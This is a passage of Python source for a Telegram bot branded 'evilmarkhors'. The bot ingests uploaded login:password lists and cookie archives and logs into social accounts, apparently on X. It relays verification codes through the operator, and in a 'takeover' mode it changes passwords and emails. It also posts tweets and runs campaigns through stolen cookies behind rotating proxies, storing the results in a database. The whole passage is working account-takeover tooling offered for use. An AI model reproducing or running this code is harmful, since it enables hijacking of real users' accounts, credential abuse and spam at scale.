                if prog.unk:
                    cap += " | unknown " + str(prog.unk)
                if prog.notes:
                    cap += "\nWajah: " + prog.notes_text(3)
                cap += prog.all_unknown_hint()
                if sink:
                    async with http_client(use_proxy=False) as client:
                        n, e = await db_upsert(client, sink)
                    cap += "\nDB added: " + str(n) + (" (" + e + ")" if e else "")
                elif smode in ("db", "both"):
                    cap += "\nDB added: 0 (koi live nahi)"
                await _send_zip(u, op, "evilmarkhors_verify.zip", cap)
                await _edit(msg, "Complete")
                await _hard_clear(uid)
                return
            cfg = SPLIT.get(uid)
            if cfg and is_zip:
                op = os.path.join(tmp, "out.zip")
                prog = Progress(msg, 0, "SPLIT")
                prog.phase = "Bucket: " + cfg["field"]
                await process_split(ip, op, cfg, g["live"], prog)
                await _send_zip(u, op, "evilmarkhors_split.zip",
                                "Split | ok " + str(prog.ok) + " | unmatched " + str(prog.fail))
                await _edit(msg, "Complete")
                await _hard_clear(uid)
                return
            if smode == "ask":
                st = {"tmp": tmp, "ip": ip, "is_zip": is_zip, "live": g["live"],
                      "count": cnt, "at": time.time()}
                STORE_ASK[uid] = st
                await _hard_clear(uid, keep_tmp=True)
                await ask_store(msg, st)
                return
            st = {"tmp": tmp, "ip": ip, "is_zip": is_zip, "live": g["live"],
                  "count": cnt, "msg": msg, "at": time.time()}
            await _hard_clear(uid, keep_tmp=True)
            await process_with_store(u, uid, st, smode)
            return
        if mode == "rework":
            op = os.path.join(tmp, "out.zip")
            prog = Progress(msg, 0, "REWORK")
            prog.phase = "Reworking"
            used = set()
            count = 0
            with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
                if is_zip:
                    with zipfile.ZipFile(ip) as zin:
                        for name in zip_txt_names(zin):
                            raw = zip_read_text(zin, name)
                            out, meta = rework_alt_cookie(
                                os.path.basename(name), raw)
                            z.writestr("reworked/" + _unique_name(
                                os.path.basename(name), used), out)
                            count += 1
                else:
                    with open(ip, encoding="utf-8", errors="ignore") as fh:
                        raw = fh.read()
                    out, meta = rework_alt_cookie(
                        (doc.file_name or "account.txt"), raw)
                    z.writestr("reworked/" + _unique_name(
                        os.path.basename(doc.file_name or "account.txt"), used), out)
                    count += 1
                z.writestr("summary.txt", "reworked: " + str(count) + "\nformat: alt_cookie_branding\n")
            cap = "Rework complete | files " + str(count)
            await _send_zip(u, op, "evilmarkhors_rework.zip", cap)
            await _edit(msg, "Complete")
            await _hard_clear(uid)
            return
        lines = []
        if is_zip:
            with zipfile.ZipFile(ip) as z:
                for n in zip_txt_names(z):
                    lines += [l for l in zip_read_text(z, n).splitlines() if l.strip()]
        else:
            with open(ip, encoding="utf-8", errors="ignore") as fh:
                lines = [l for l in fh.read().splitlines() if l.strip()]
        if not lines:
            await _edit(msg, "Koi line nahi mili.")
            await _hard_clear(uid)
            return
        prog = Progress(msg, len(lines), "ULP process")
        prog.phase = "Login + verify"
        await run_ulp_batch(uid, lines, prog)
        await after_batch(uid, u, msg)
    except asyncio.CancelledError:
        await _edit(msg, "Cancel.")
        raise
    except Exception as e:
        logging.error("handle_file\n%s", traceback.format_exc())
        await _edit(msg, "Error: " + str(e) + "\n/cancel karke dobara try karo.")
        if uid in BATCH and not PEND.get(uid):
            await _hard_clear(uid)


async def after_batch(uid, u, msg):
    b = BATCH.get(uid)
    if not b:
        return
    pend = PEND.get(uid, {})
    if pend:
        rows = [b["lines"][int(k)].split(":")[0] + " -> " + v["kind"]
                for k, v in list(pend.items())[:40]]
        ok_n, fail_n, pend_n = batch_counts(b, pend)
        await _edit(msg, "ok " + str(ok_n) + " | fail " + str(fail_n) + " | code " + str(pend_n))
        await u.message.reply_text(str(pend_n) + " ko code chahiye:\n\n" + "\n".join(rows)
                                   + "\n\nBhejo: username code. Baad mein /finalize.")
    else:
        await finalize_batch(uid, u)


async def finalize_batch(uid, u):
    b = BATCH.get(uid)
    if not b:
        await u.message.reply_text("Koi batch nahi.")
        return
    cur = JOBS.get(uid)
    if cur and cur["task"] is not asyncio.current_task() and not cur["task"].done():
        await u.message.reply_text("Kaam chal raha hai. Khatam hone do ya /cancel.")
        return
    save_batch(uid, force=True)
    op = os.path.join(b["tmp"], "out.zip")
    build_zip(op, uid)
    succ, bfail, npend = batch_counts(b, PEND.get(uid, {}))
    await _send_zip(u, op, "evilmarkhors_" + b["mode"] + ".zip",
                    "Done | ok " + str(succ) + " | fail " + str(bfail)
                    + " | pending " + str(npend) + "\n" + WEBSITE)
    await _hard_clear(uid)


async def on_text(u, c):
    uid = str(u.effective_user.id)
    txt = (u.message.text or "").strip()
    cfg = CAMPS.get(uid)
    if cfg and cfg.get("stage") == "text":
        if txt:
            cfg["roles"][cfg["role"]].append(txt)
            save_camp(uid)
        await u.message.reply_text(cfg["role"] + ": "
                                   + str(len(cfg["roles"][cfg["role"]])) + " variants.")
        return
    t = TWEET.get(uid)
    if t and t["stage"] == "content":
        if txt:
            TWEET[uid]["variants"].append(txt)
        await u.message.reply_text("Variant " + str(len(TWEET[uid]["variants"]))
                                   + " add. Aur bhejo ya /tweetgo.")
        return
    if t and t["stage"] == "cookies":
        await u.message.reply_text("Ab cookie zip bhejo.")
        return
    if uid not in BATCH or not PEND.get(uid):
        return
    b, pend = BATCH[uid], PEND[uid]
    byname = {b["lines"][int(k)].split(":")[0].strip().lower(): k for k in pend}
    pairs = []
    for line in txt.splitlines():
        parts = line.strip().split()
        if not parts:
            continue
        key = parts[0].strip().lower()
        if len(parts) >= 2 and key in byname:
            pairs.append((byname[key], parts[-1]))
        elif len(pend) == 1:
            pairs.append((list(pend.keys())[0], parts[-1]))
    if not pairs:
        await u.message.reply_text("Format: username code")
        return
    for key, code in pairs:
        st = pend.get(key)
        if not st:
            continue
        try:
            if st["kind"] == "login":
                r = await resume_login(st, code)
                if r == "more":
                    await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
                                               + ": aur ek code.")
                    continue
                keep = False
                if r == "ok":
                    res = await finish_account(uid, st["idx"], st["ulp"], st["client"])
                    if res == "email_pending":
                        # finish_account ne isi key par email entry daali hai,
                        # isliye login entry ko delete mat karo.
                        keep = True
                        await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
                                                   + ": email set, code bhejo.")
                    elif res == "fail":
                        err = (b["results"][st["idx"]] or {}).get("err")
                        why = ("cookie dead nikli" if err == "cookie_dead"
                               else "verify confirm nahi hua (network)")
                        await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
                                                   + ": " + why + ".")
                    else:
                        # finish_account khud b["ok"] barhata hai - yahan dobara
                        # count karne se total galat aata tha.
                        await u.message.reply_text((st["ulp"]["username"] or st["ulp"]["email"])
                                                   + ": done")
                else:
                    b["results"][st["idx"]] = {"ok": False, "line": b["lines"][st["idx"]],
                                               "err": "code_failed"}
                    b["fail"] += 1
                    try:
                        await st["client"].aclose()
                    except Exception:
                        pass
                if not keep:
                    del pend[key]
                save_batch(uid)
            elif st["kind"] == "email":
                ck = dict(st["client"].cookies)
                if await confirm_email(st["client"], ck, code):
                    res = b["results"][st["idx"]]
                    if b["takeover"]:
                        np = b["newpass"] or gen_pass()
                        if await change_pass(st["client"], ck, st["ulp"]["password"], np):
                            res["new_pass"] = np
                    b["ok"] += 1
                    del pend[key]
                    await st["client"].aclose()
                    save_batch(uid)
                else:
                    await u.message.reply_text("Code galat, dobara bhejo.")
        except Exception:
            logging.error("on_text\n%s", traceback.format_exc())
    if not pend:
        await u.message.reply_text("Sab codes mil gaye - finalize.")
        await finalize_batch(uid, u)
    else:
        await u.message.reply_text(str(len(pend)) + " pending. Baaki bhejo ya /finalize.")


async def finalize_cmd(u, c):
    await finalize_batch(str(u.effective_user.id), u)


async def cancel_cmd(u, c):
    uid = str(u.effective_user.id)
    kind = await stop_job(uid)
    state = CAMPRUN.get(uid)
    if state is not None:
        state["stop"] = True
    st = STORE_ASK.pop(uid, None)
    if st:
        shutil.rmtree(st.get("tmp", ""), ignore_errors=True)
    t = TWEET.pop(uid, None)
    if t and t.get("tmp"):
        shutil.rmtree(t["tmp"], ignore_errors=True)
    SPLIT.pop(uid, None)
    CTEST.pop(uid, None)
    ex = EXTRACT.get(uid)
    if ex:
        ex["stage"] = "idle"
    cfg = CAMPS.get(uid)
    if cfg and not CAMPRUN.get(uid) and cfg.get("stage") in ("text", "media", "cookies"):
        cfg["stage"] = "idle"
        save_camp(uid)
    await _hard_clear(uid)
    await u.message.reply_text("Cancel" + (" (" + kind + ")" if kind else ""))


async def on_error(u, c):
    logging.error("HANDLER ERROR\n%s",
                  "".join(traceback.format_exception(None, c.error, c.error.__traceback__)))
    try:
        if u and u.effective_message:
            await u.effective_message.reply_text(
                "Kuch gadbad ho gayi. Dobara try karo ya /cancel se reset.")
    except Exception:
        pass


# ============================ MAIN ============================
async def post_init(app):
    load_batches()
    load_camps()
    for uid in list(BATCH.keys()):
        try:
            await app.bot.send_message(int(uid), "Purana batch mila. /finalize ya /cancel.")
        except Exception:
            pass
    app.bot_data["rev"] = asyncio.create_task(reverify_loop(app))
    app.bot_data["jan"] = asyncio.create_task(janitor_loop())
    if NETCHECK_ON_START:
        app.bot_data["net"] = asyncio.create_task(startup_netcheck(app))
    app.bot_data["health"] = asyncio.create_task(start_health_server())
    logging.info("reverify loop start (%sh)", REVERIFY_HOURS)


async def post_shutdown(app):
    tasks = []
    for key in ("rev", "jan", "net"):
        t = app.bot_data.get(key)
        if t:
            t.cancel()
            tasks.append(t)
    for uid in list(JOBS.keys()):
        job = JOBS.pop(uid, None)
        if job and not job["task"].done():
            job["task"].cancel()
            tasks.append(job["task"])
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    await stop_health_server()
    await close_shared_client()


async def _spawn(u, kind, factory):
    uid = str(u.effective_user.id)
    task = start_job(uid, kind, factory)
    if task is None:
        cur = job_running(uid)
        await u.message.reply_text("Pehle wala kaam (" + (cur or "?")
                                   + ") chal raha hai. /cancel.")
    return task


async def on_doc(u, c):
    doc = u.message.document
    if not doc:
        return
    uid = str(u.effective_user.id)
    low = (doc.file_name or "").lower()
    if uid in CTEST and low.endswith(".txt"):
        CTEST.pop(uid, None)
        await country_test(u, doc)
        return
    cfg = CAMPS.get(uid)
    if cfg and cfg.get("stage") == "cookies":
        if time.time() - cfg.get("stage_at", 0) > CAMP_STAGE_SEC:
            # Purana stage har naye zip ko campaign samajh leta hai - expire.
            cfg["stage"] = "idle"
            save_camp(uid)
        elif low.endswith(".zip"):
            await _spawn(u, "camp", lambda: run_campaign(u, c, doc))
            return
    ex = EXTRACT.get(uid)
    if ex and ex.get("stage") == "await" and low.endswith(".zip"):
        await _spawn(u, "extract", lambda: run_extract(u, doc))
        return
    t = TWEET.get(uid)
    if t and t["stage"] == "cookies" and low.endswith(".zip"):
        await _spawn(u, "tweet", lambda: run_tweet_batch(u, doc))
        return
    await _spawn(u, "file", lambda: handle_file(u, c, doc))



async def _health_handler(reader, writer):
    """Minimal HTTP health check endpoint."""
    try:
        data = await reader.read(1024)
        if not data:
            writer.close()
            return
        request_line = data.split(b'\n')[0].decode('utf-8', errors='ignore')
        parts = request_line.split()
        method = parts[0] if len(parts) > 0 else ''
        path = parts[1] if len(parts) > 1 else ''

        if method == 'GET' and path == '/healthz':
            # Build health status
            db_status = 'ok' if db_enabled() else 'off'
            proxy_status = 'off'
            proxy_count = 0
            proxy_banned = 0
            proxy_fails = 0
            if PROXIES:
                proxy_status = 'on' if not PROXY_DISABLED else 'disabled'
                proxy_count = len(PROXIES)
                now = time.time()
                for p in PROXIES:
                    if PROXY_BANNED_UNTIL.get(p, 0) and now < PROXY_BANNED_UNTIL[p]:
                        proxy_banned += 1
                    if PROXY_FAILS.get(p, 0):
                        proxy_fails += PROXY_FAILS[p]
            elif PROXY_DISABLED:
                proxy_status = 'disabled'

            last_err = NET_LAST.get("what", "") or "none"
            last_err_ago = 0
            if NET_LAST.get("at"):
                last_err_ago = max(int(time.time() - NET_LAST["at"]), 0)

            uptime = int(time.time() - _START_TIME)
            body = ('{"status":"ok","db":"%s","proxy":"%s","live":"%s",'
                    '"proxy_count":%d,"proxy_banned":%d,"proxy_fails":%d,'
                    '"uptime":%d,"last_error":"%s","last_error_ago":%d}'
                    % (db_status, proxy_status,
                       'on' if LIVE_DEFAULT else 'off',
                       proxy_count, proxy_banned, proxy_fails,
                       uptime,
                       last_err.replace('"', '\"')[:100], last_err_ago))
            response = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: application/json\r\n"
                "Content-Length: %d\r\n"
                "Connection: close\r\n"
                "\r\n"
                "%s" % (len(body), body))
        else:
            response = (
                "HTTP/1.1 404 Not Found\r\n"
                "Content-Length: 0\r\n"
                "Connection: close\r\n"
                "\r\n")

        writer.write(response.encode('utf-8'))
        await writer.drain()
    except Exception:
        pass
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


async def start_health_server():
    """Health check server shuru karein agar HEALTH_CHECK_PORT set hai."""
    global _health_server
    if HEALTH_CHECK_PORT <= 0:
        return
    try:
        _health_server = await asyncio.start_server(
            _health_handler, HEALTH_CHECK_HOST, HEALTH_CHECK_PORT)
        logging.info("Health check server on %s:%d",
                     HEALTH_CHECK_HOST, HEALTH_CHECK_PORT)
    except Exception:
        logging.exception("Health check server start fail")


async def stop_health_server():
    """Health check server band karein."""
    global _health_server
    if _health_server is not None:
        _health_server.close()
        try:
            await _health_server.wait_closed()
        except Exception:
            pass
        _health_server = None


def main():
    made = bootstrap()
    if made:
        print("Bani files:", ", ".join(made))
    if "--init" in sys.argv:
        return
    if not ADMIN_IDS:
        print("FATAL: ADMIN_IDS env zaroori hai (koi default nahi). Bot start nahi hoga.")
        return 1
    os.makedirs(STATE_DIR, exist_ok=True)
    load_store()
    load_proxies()
    if PROXIES:
        logging.info("Proxy: %s configured (%s)", len(PROXIES), proxy_mode())
    else:
        logging.info("Proxy: OFF (direct)")
    os.makedirs(CAMP_MEDIA_DIR, exist_ok=True)
    if not db_enabled():
        logging.warning("SUPABASE_URL/KEY missing - DB features off")
    # SUPABASE_KEY service_role hai: ye RLS bypass karta hai. Kabhi logs/env
    # mein na le jayein, aur rotate karein agar kabhi leak ho.
    if SUPABASE_KEY and len(SUPABASE_KEY) < 40:
        logging.warning("SUPABASE_KEY suspicious short - service_role key lamba hona chahiye")
    app = (ApplicationBuilder().token(BOT_TOKEN).concurrent_updates(True)
           .post_init(post_init).post_shutdown(post_shutdown).build())
    handlers = [
        ("start", start), ("help", help_cmd), ("commands", commands_cmd),
        ("status", status_cmd), ("diag", diag_cmd), ("proxy", proxy_cmd),
        ("netcheck", netcheck_cmd),
        ("store", store_cmd),
        ("mode", mode_cmd), ("verify", verify_cmd), ("rework", rework_cmd), ("live", live_cmd),
        ("takeover", takeover_cmd), ("newpass", newpass_cmd), ("newemail", newemail_cmd),
        ("finalize", finalize_cmd), ("cancel", cancel_cmd),
        ("split", split_cmd), ("splitoff", splitoff_cmd), ("extract", extract_cmd),
        ("camp", camp_cmd), ("stopcamp", stopcamp_cmd), ("report", report_cmd),
        ("db", db_cmd), ("broadcast", broadcast_cmd), ("countrytest", countrytest_cmd),
        ("tweet", tweet_cmd), ("tweetgo", tweetgo_cmd), ("tweetcancel", tweetcancel_cmd),
        ("delbatches", delbatches_cmd), ("delbatch", delbatch_cmd),
    ]
    for cmd, fn in handlers:
        app.add_handler(CommandHandler(cmd, fn))
    app.add_handler(CallbackQueryHandler(on_store_cb, pattern=r"^store:"))
    app.add_handler(CallbackQueryHandler(on_cmd_cb, pattern=r"^cmdp:"))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO | filters.ANIMATION
                                   | filters.Document.IMAGE
                                   | filters.Document.VIDEO, on_media))
    app.add_handler(MessageHandler(
        filters.Document.ALL & ~filters.Document.IMAGE & ~filters.Document.VIDEO,
        on_doc))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)
    logging.info("Bot chalu | db=%s | proxy=%s | live=%s | state=%s",
                 db_enabled(), (str(len(PROXIES)) if PROXIES else "off"),
                 ("on" if LIVE_DEFAULT else "OFF"), STATE_DIR)
    if not LIVE_DEFAULT:
        logging.warning("LIVE=0: cookie/verify rework koi X API call nahi karega, "
                        "sab UNKNOWN aayega")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()



